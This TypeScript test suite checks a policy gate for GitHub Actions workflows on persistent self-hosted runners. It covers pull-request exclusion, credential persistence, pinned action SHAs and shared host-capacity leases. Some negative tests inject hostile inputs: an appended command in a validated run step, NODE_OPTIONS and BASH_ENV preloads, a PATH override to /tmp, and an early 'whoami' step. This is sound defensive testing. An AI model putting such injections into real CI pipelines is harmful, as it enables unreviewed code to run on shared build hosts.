                'runs-on': ['self-hosted', 'macOS'],
                if: ifCondition,
                steps: [],
              },
            },
          },
        },
      ]);

      expect(findings).toEqual([
        expect.objectContaining({
          file: '.github/workflows/ci.yml',
          jobId: 'unsafeContinuation',
          message:
            'persistent self-hosted jobs must skip automatic pull_request execution',
        }),
      ]);
    },
  );

  test('recognizes runner-group objects and fails closed on unknown expressions', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/group.yml',
        document: {
          jobs: {
            grouped: {
              'runs-on': { group: 'Kontour Build Fleet' },
              if: "github.event_name != 'pull_request'",
              steps: [
                {
                  uses: 'actions/setup-node@full-sha',
                  with: { cache: 'npm' },
                },
              ],
            },
            unknown: {
              'runs-on': '$' + '{{ inputs.runner }}',
              steps: [],
            },
          },
        },
      },
    ]);
    expect(findings.map(({ jobId }) => jobId)).toEqual(['grouped', 'unknown']);
  });

  test('rejects automatic PR execution and retained checkout credentials', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/unsafe.yml',
        document: {
          jobs: {
            unsafe: {
              'runs-on': ['self-hosted', 'macOS'],
              steps: [{ uses: 'actions/checkout@full-sha' }],
            },
          },
        },
      },
    ]);
    expect(findings.map(({ message }) => message)).toEqual([
      expect.stringContaining('skip automatic pull_request'),
      expect.stringContaining('persist-credentials'),
    ]);
  });

  test('does not let a hosted matrix base hide a self-hosted include', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/matrix.yml',
        document: {
          jobs: {
            mixed: {
              'runs-on': '$' + '{{ matrix.runner }}',
              strategy: {
                matrix: {
                  runner: ['ubuntu-latest'],
                  include: [{ runner: ['self-hosted', 'Linux'] }],
                },
              },
              steps: [{ uses: 'actions/checkout@full-sha' }],
            },
          },
        },
      },
    ]);
    expect(findings.map(({ message }) => message)).toEqual([
      expect.stringContaining('skip automatic pull_request'),
      expect.stringContaining('persist-credentials'),
      'persistent Linux jobs must target an exclusive heavy-host or fast-feedback listener',
    ]);
  });

  test('rejects custom labels that only resemble hosted images', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/custom.yml',
        document: {
          jobs: {
            custom: { 'runs-on': 'ubuntu-private', steps: [] },
          },
        },
      },
    ]);
    expect(findings).toEqual([
      expect.objectContaining({
        jobId: 'custom',
        message: expect.stringContaining('unresolved'),
      }),
    ]);
  });

  test('requires physical-host capacity coordination on desktop-win jobs', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fast: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              steps: [],
            },
          },
        },
      },
    ]);
    expect(findings).toEqual([
      expect.objectContaining({
        jobId: 'fast',
        message: expect.stringContaining('shared physical-host capacity'),
      }),
    ]);
  });

  test('rejects an unreviewed capacity-action revision and missing explicit inputs', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fast: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 90,
              steps: [
                {
                  uses: 'kontourai/.github/actions/physical-host-capacity@0000000000000000000000000000000000000000',
                  with: { 'host-id': 'desktop-win' },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(findings.map(({ message }) => message)).toEqual([
      expect.stringContaining(
        `reviewed action commit ${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
      ),
      expect.stringContaining(
        'coordination-root, capacity-units, lease-weight, timeout-seconds, owner-lifetime-seconds',
      ),
      expect.stringContaining('owner-lifetime-seconds: 7800'),
    ]);
  });

  test('accepts an immutable capacity action with the complete contract', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fast: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 90,
              steps: [
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 8,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(findings).toEqual([]);
  });

  test('rejects work before physical-host capacity admission', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fast: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 90,
              steps: [
                {
                  uses: 'actions/checkout@reviewed',
                  with: { 'persist-credentials': false },
                },
                {
                  uses: 'kontourai/.github/actions/runner-preflight@reviewed',
                },
                { uses: 'actions/setup-node@reviewed' },
                { run: 'npm run dependencies:ci' },
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 8,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'physical-host-capacity must run before every step except checkout, setup-node, runner-preflight, and the exact Nightly rebuild-index prevalidation',
    ]);
  });

  test('permits only the exact pure Nightly rebuild-index prevalidation before capacity', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/nightly.yml',
        document: {
          jobs: {
            nightly: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 90,
              env: {
                GCP_PLAY_WORKLOAD_IDENTITY_PROVIDER:
                  '${' + '{ vars.GCP_PLAY_WORKLOAD_IDENTITY_PROVIDER }}',
                GCP_PLAY_SERVICE_ACCOUNT:
                  '${' + '{ vars.GCP_PLAY_SERVICE_ACCOUNT }}',
                ANDROID_UPLOAD_KEY_ALIAS:
                  '${' + '{ vars.ANDROID_UPLOAD_KEY_ALIAS }}',
                ANDROID_UPLOAD_CERT_SHA256:
                  '${' + '{ vars.ANDROID_UPLOAD_CERT_SHA256 }}',
                ANDROID_BUILD_TOOLS_VERSION: '36.0.0',
                STATION_MOBILE_DEFAULT_ENDPOINT:
                  '${' + '{ vars.STATION_MOBILE_DEFAULT_ENDPOINT_NIGHTLY }}',
              },
              steps: [
                {
                  name: 'Validate requested Nightly rebuild index',
                  env: {
                    NIGHTLY_REBUILD_INDEX: '${' + '{ inputs.rebuild_index }}',
                  },
                  shell: 'bash',
                  run: [
                    "node --input-type=module -e '",
                    '  import { parseNightlyRebuildIndex } from "./scripts/lib/nightly-build-identity.mjs";',
                    '  parseNightlyRebuildIndex(process.env.NIGHTLY_REBUILD_INDEX);',
                    "'",
                    '',
                  ].join('\n'),
                },
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 9,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(findings).toEqual([]);
  });

  test.each([
    [
      'an appended command',
      (step: Record<string, unknown>) => {
        step.run = `${step.run}\nnpm ci`;
      },
    ],
    [
      'a comment-only parser reference',
      (step: Record<string, unknown>) => {
        step.run = '# parseNightlyRebuildIndex NIGHTLY_REBUILD_INDEX\nnpm ci';
      },
    ],
    [
      'an overridden input environment',
      (step: Record<string, unknown>) => {
        step.env = { NIGHTLY_REBUILD_INDEX: 'true' };
      },
    ],
  ])('rejects Nightly prevalidation with %s', (_name, mutate) => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/nightly.yml',
    );
    if (!workflow) throw new Error('Expected the checked-in Nightly workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: { nightly: { steps: Array<Record<string, unknown>> } };
    };
    const validation = document.jobs.nightly.steps.find(
      (step) => step.name === 'Validate requested Nightly rebuild index',
    );
    if (!validation)
      throw new Error('Expected the Nightly prevalidation step.');
    mutate(validation);

    expect(
      persistentRunnerPolicyFindings([
        { file: '.github/workflows/nightly.yml', document },
      ]).map(({ message }) => message),
    ).toContain(
      'physical-host-capacity must run before every step except checkout, setup-node, runner-preflight, and the exact Nightly rebuild-index prevalidation',
    );
  });

  test('rejects the exact prevalidation shape outside the Nightly job', () => {
    const workflow = readWorkflowDocuments().find(
      ({ file }) => file === '.github/workflows/nightly.yml',
    );
    if (!workflow) throw new Error('Expected the checked-in Nightly workflow.');
    const document = structuredClone(workflow.document) as {
      jobs: Record<string, unknown>;
    };

    expect(
      persistentRunnerPolicyFindings([
        { file: '.github/workflows/other.yml', document },
      ]).map(({ message }) => message),
    ).toContain(
      'physical-host-capacity must run before every step except checkout, setup-node, runner-preflight, and the exact Nightly rebuild-index prevalidation',
    );
  });

  test.each([
    [
      'a workflow NODE_OPTIONS preload',
      (document: MutableNightlyWorkflow) => {
        document.env = { NODE_OPTIONS: '--import=./early-work.mjs' };
      },
    ],
    [
      'a job BASH_ENV preload',
      (document: MutableNightlyWorkflow) => {
        document.jobs.nightly.env.BASH_ENV = './early-work.sh';
      },
    ],
    [
      'a job PATH override',
      (document: MutableNightlyWorkflow) => {
        document.jobs.nightly.env.PATH = '/tmp/early-work';
      },
    ],
    [
      'a workflow run working-directory default',
      (document: MutableNightlyWorkflow) => {
        document.defaults = { run: { 'working-directory': '/tmp' } };
      },
    ],
    [
      'a job run working-directory default',
      (document: MutableNightlyWorkflow) => {
        document.jobs.nightly.defaults = {
          run: { 'working-directory': '/tmp' },
        };
      },
    ],
  ])(
    'rejects inherited Nightly prevalidation context with %s',
    (_name, mutate) => {
      const workflow = readWorkflowDocuments().find(
        ({ file }) => file === '.github/workflows/nightly.yml',
      );
      if (!workflow)
        throw new Error('Expected the checked-in Nightly workflow.');
      const document = structuredClone(
        workflow.document,
      ) as MutableNightlyWorkflow;
      mutate(document);

      expect(
        persistentRunnerPolicyFindings([
          { file: '.github/workflows/nightly.yml', document },
        ]).map(({ message }) => message),
      ).toContain(
        'physical-host-capacity must run before every step except checkout, setup-node, runner-preflight, and the exact Nightly rebuild-index prevalidation',
      );
    },
  );

  test('requires a bounded timeout and shared owner lifetime for direct capacity jobs', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            fast: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 126,
              steps: [
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 8,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 5999,
                  },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(findings.map(({ message }) => message)).toEqual([
      'physical-host-capacity must set owner-lifetime-seconds: 7800',
      'physical-host-capacity jobs must set timeout-minutes from 1 through 125',
    ]);
  });

  test('accepts the exact shared lifetime at the no-heartbeat deadline boundary', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/interactive-workspace-performance.yml',
        document: {
          jobs: {
            'one-hour-collaboration-reference': {
              'runs-on': [
                'self-hosted',
                'Windows',
                'X64',
                'kontour-windows',
                'native',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 125,
              steps: [
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': 'E:\\kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 6,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
    ]);

    expect(findings).toEqual([]);
  });

  test('reserves exactly one desktop-win unit for ci.yml fast-checks', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            'fast-checks': {
              'runs-on': ['self-hosted', 'Linux', 'X64', 'fast-feedback'],
              if: SAME_REPOSITORY_FAST_CHECKS_CONDITION,
              'timeout-minutes': 15,
              steps: [
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 4,
                    'timeout-seconds': 300,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'ci.yml fast-checks must reserve exactly 1 physical-host capacity unit',
    ]);
  });

  test('caps every other desktop-win capacity reservation at nine units', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            heavy: {
              'runs-on': [
                'self-hosted',
                'Linux',
                'X64',
                'kontour-linux',
                'heavy-host',
              ],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 90,
              steps: [
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 10,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
      {
        file: '.github/workflows/secret-scan.yml',
        document: {
          jobs: {
            scan: {
              uses: 'kontourai/.github/.github/workflows/secret-scan.yml@02f40a67901a79ce4004c44d91e350b93782644c',
              if: "github.event_name != 'pull_request'",
              with: {
                runner:
                  '["self-hosted","Linux","X64","kontour-linux","heavy-host"]',
                'capacity-coordination-root': '/mnt/e/kontour-runner-capacity',
                'capacity-host-id': 'desktop-win',
                'capacity-lease-weight': 10,
                'capacity-owner-lifetime-seconds': 7800,
              },
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'desktop-win capacity reservations other than ci.yml fast-checks must use a literal lease-weight from 1 through 9',
      'desktop-win capacity reservations other than ci.yml fast-checks must use a literal lease-weight from 1 through 9',
    ]);
  });

  test('requires reusable capacity callers to pin and pass through shared ownership', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/secret-scan.yml',
        document: {
          jobs: {
            scan: {
              uses: 'kontourai/.github/.github/workflows/secret-scan.yml@0000000000000000000000000000000000000000',
              with: {
                'capacity-coordination-root': '/mnt/e/kontour-runner-capacity',
                'capacity-owner-lifetime-seconds': 5999,
              },
            },
          },
        },
      },
    ]);
    expect(findings.map(({ message }) => message)).toEqual([
      'reusable capacity callers must use reviewed workflow commit 02f40a67901a79ce4004c44d91e350b93782644c',
      'reusable capacity callers must set capacity-owner-lifetime-seconds: 7800',
      'reusable capacity runner must be a literal JSON array of runner labels',
    ]);
  });

  test('fails closed when reusable capacity routing is dynamic', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/secret-scan.yml',
        document: {
          jobs: {
            scan: {
              uses: 'kontourai/.github/.github/workflows/secret-scan.yml@02f40a67901a79ce4004c44d91e350b93782644c',
              if: "github.event_name != 'pull_request'",
              with: {
                runner: '$' + '{{ vars.SECRET_SCAN_RUNNER }}',
                'capacity-coordination-root': '/mnt/e/kontour-runner-capacity',
                'capacity-owner-lifetime-seconds': 7800,
              },
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'reusable capacity runner must be a literal JSON array of runner labels',
    ]);
  });

  test('rejects a reusable workflow routed to a persistent runner without a pull-request exclusion', () => {
    const nonConformantWorkflow = {
      file: '.github/workflows/non-conformant-reusable.yml',
      document: {
        jobs: {
          heavy: {
            uses: `kontourai/.github/.github/workflows/secret-scan.yml@02f40a67901a79ce4004c44d91e350b93782644c`,
            with: {
              runner:
                '["self-hosted","Linux","X64","kontour-linux","heavy-host"]',
              'capacity-coordination-root': '/mnt/e/kontour-runner-capacity',
              'capacity-host-id': 'desktop-win',
              'capacity-lease-weight': 9,
              'capacity-owner-lifetime-seconds': 7800,
            },
          },
        },
      },
    };

    expect(
      persistentRunnerPolicyFindings([nonConformantWorkflow]),
    ).toContainEqual({
      file: '.github/workflows/non-conformant-reusable.yml',
      jobId: 'heavy',
      message:
        'persistent self-hosted reusable-workflow jobs must skip automatic pull_request execution',
    });
  });

  test('allows a reusable persistent workflow with the exact pull-request exclusion', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/secret-scan.yml',
        document: {
          jobs: {
            scan: {
              uses: `kontourai/.github/.github/workflows/secret-scan.yml@02f40a67901a79ce4004c44d91e350b93782644c`,
              if: "github.event_name != 'pull_request'",
              with: {
                runner:
                  '["self-hosted","Linux","X64","kontour-linux","heavy-host"]',
                'capacity-coordination-root': '/mnt/e/kontour-runner-capacity',
                'capacity-host-id': 'desktop-win',
                'capacity-lease-weight': 9,
                'capacity-owner-lifetime-seconds': 7800,
              },
            },
          },
        },
      },
    ]);

    expect(findings).toEqual([]);
  });

  test('rejects broad persistent Linux routing that can consume the fast lane', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/broad.yml',
        document: {
          jobs: {
            broad: {
              'runs-on': ['self-hosted', 'Linux'],
              if: "github.event_name != 'pull_request'",
              steps: [],
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'persistent Linux jobs must target an exclusive heavy-host or fast-feedback listener',
    ]);
  });

  test('partitions the dedicated fast listener from leased Linux heavy work', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/ci.yml',
        document: {
          jobs: {
            'fast-checks': {
              'runs-on': ['self-hosted', 'Linux', 'X64', 'kontour-linux'],
              if: SAME_REPOSITORY_FAST_CHECKS_CONDITION,
              'timeout-minutes': 15,
              steps: [],
            },
            heavy: {
              'runs-on': ['self-hosted', 'Linux', 'X64', 'kontour-linux'],
              if: "github.event_name != 'pull_request'",
              'timeout-minutes': 90,
              steps: [
                {
                  uses: `kontourai/.github/actions/physical-host-capacity@${REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA}`,
                  with: {
                    'coordination-root': '/mnt/e/kontour-runner-capacity',
                    'host-id': 'desktop-win',
                    'capacity-units': 10,
                    'lease-weight': 9,
                    'timeout-seconds': 600,
                    'owner-lifetime-seconds': 7800,
                  },
                },
              ],
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'desktop-win jobs must reserve shared physical-host capacity',
      'ci.yml fast-checks must target the dedicated fast-feedback listener',
      'ci.yml fast-checks must retain physical-host capacity coordination',
      'persistent Linux jobs must target an exclusive heavy-host or fast-feedback listener',
    ]);
  });

  test('keeps reusable Linux capacity callers off the fast listener', () => {
    const findings = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/secret-scan.yml',
        document: {
          jobs: {
            scan: {
              uses: 'kontourai/.github/.github/workflows/secret-scan.yml@02f40a67901a79ce4004c44d91e350b93782644c',
              if: "github.event_name != 'pull_request'",
              with: {
                runner: '["self-hosted","Linux","X64","fast-feedback"]',
                'capacity-coordination-root': '/mnt/e/kontour-runner-capacity',
                'capacity-owner-lifetime-seconds': 7800,
              },
            },
          },
        },
      },
    ]);

    expect(findings.map(({ message }) => message)).toEqual([
      'fast-feedback is reserved for ci.yml fast-checks only',
      'leased Linux jobs must target the heavy-host listener, not shared feedback capacity',
    ]);
  });

  test('permits only the exact terminal-owner recovery action to bypass its own capacity deadlock', () => {
    const recoveryJob = {
      'runs-on': ['self-hosted', 'Linux', 'X64', 'kontour-linux', 'heavy-host'],
      if: "github.event_name != 'pull_request' && inputs.runner == 'linux'",
      'timeout-minutes': 5,
      steps: [
        {
          uses: 'kontourai/.github/actions/recover-terminal-capacity-owner@563effe7ec559c6f4fcc6c80b3532acb71d86373',
          with: { 'owner-lifetime-seconds': 7800 },
        },
      ],
    };
    const accepted = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/recover-terminal-capacity-owner.yml',
        document: { jobs: { 'recover-linux': recoveryJob } },
      },
    ]);
    expect(accepted).toEqual([]);

    const mismatchedLifetime = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/recover-terminal-capacity-owner.yml',
        document: {
          jobs: {
            'recover-linux': {
              ...recoveryJob,
              steps: [
                {
                  ...recoveryJob.steps[0],
                  with: { 'owner-lifetime-seconds': 6000 },
                },
              ],
            },
          },
        },
      },
    ]);
    expect(mismatchedLifetime.map(({ message }) => message)).toContain(
      'terminal capacity recovery must set owner-lifetime-seconds: 7800',
    );

    const widened = persistentRunnerPolicyFindings([
      {
        file: '.github/workflows/recover-terminal-capacity-owner.yml',
        document: {
          jobs: {
            'recover-linux': {
              ...recoveryJob,
              steps: [{ run: 'whoami' }, ...recoveryJob.steps],
            },
          },
        },
      },
    ]);
    expect(widened.map(({ message }) => message)).toContain(
      'desktop-win jobs must reserve shared physical-host capacity',
    );
  });
});

describe('the real workflow corpus', () => {
  // Every other test in this file feeds `persistentRunnerPolicyFindings`
  // synthetic documents built from REVIEWED_PHYSICAL_HOST_CAPACITY_ACTION_SHA,
  // so they agree with that constant whatever it says. That is how #3443 landed
  // a repin that moved the workflows and the contract test but not this gate:
  // `actionlint-gate` reported 125/125 while the gate itself rejected every
  // workflow on `main`. This test is the independent cross-check — it reads the
  // checked-in workflows through the gate's own loader, so a constant that
  // disagrees with the tree fails here in either direction.
  const workflows = readWorkflowDocuments();

  test('loads the checked-in workflows', () => {
    // Without this, a loader that returned nothing would make the assertion
    // below pass over an empty corpus.
    expect(workflows.length).toBeGreaterThan(10);
    // A parse that yielded documents without `jobs` would give the policy
    // nothing to examine — the same silent pass as an empty corpus.
    expect(
      workflows.filter(
        ({ document }) =>
          typeof document === 'object' &&
          document !== null &&
          Object.hasOwn(document, 'jobs'),
      ).length,
    ).toBeGreaterThan(10);
  });

  test('satisfies the persistent-runner policy it is checked against', () => {
    expect(
      persistentRunnerPolicyFindings(workflows).map(
        ({ file, jobId, message }) => `${file} ${jobId}: ${message}`,
      ),
    ).toEqual([]);
  });

  test('uses one host-manifest lifetime that covers every admitted timeout without heartbeat renewal', () => {
    let directCapacityJobs = 0;
    let recoveryJobs = 0;
    let reusableCapacityJobs = 0;

    for (const { document } of workflows) {
      const jobs =
        (document as { jobs?: Record<string, ParsedWorkflowJob> }).jobs ?? {};
      for (const job of Object.values(jobs)) {
        const capacityStep = job.steps?.find(
          (step) =>
            typeof step?.uses === 'string' &&
            step.uses.startsWith(
              'kontourai/.github/actions/physical-host-capacity@',
            ),
        );
        if (capacityStep) {
          directCapacityJobs += 1;
          expect(String(capacityStep.with?.['owner-lifetime-seconds'])).toBe(
            '7800',
          );
          const timeoutMinutes = job['timeout-minutes'];
          expect(typeof timeoutMinutes).toBe('number');
          if (typeof timeoutMinutes !== 'number') {
            throw new Error('capacity job must declare a numeric timeout');
          }
          expect(timeoutMinutes * 60 + 300).toBeLessThanOrEqual(7800);
        }

        const recoveryStep = job.steps?.find(
          (step) =>
            step?.uses ===
            'kontourai/.github/actions/recover-terminal-capacity-owner@563effe7ec559c6f4fcc6c80b3532acb71d86373',
        );
        if (recoveryStep) {
          recoveryJobs += 1;
          expect(String(recoveryStep.with?.['owner-lifetime-seconds'])).toBe(
            '7800',
          );
        }

        if (job.with?.['capacity-coordination-root'] !== undefined) {
          reusableCapacityJobs += 1;
          expect(String(job.with['capacity-owner-lifetime-seconds'])).toBe(
            '7800',
          );
        }
      }
    }

    expect(directCapacityJobs).toBeGreaterThanOrEqual(20);
    expect(recoveryJobs).toBe(2);
    expect(reusableCapacityJobs).toBeGreaterThan(0);
  });
});
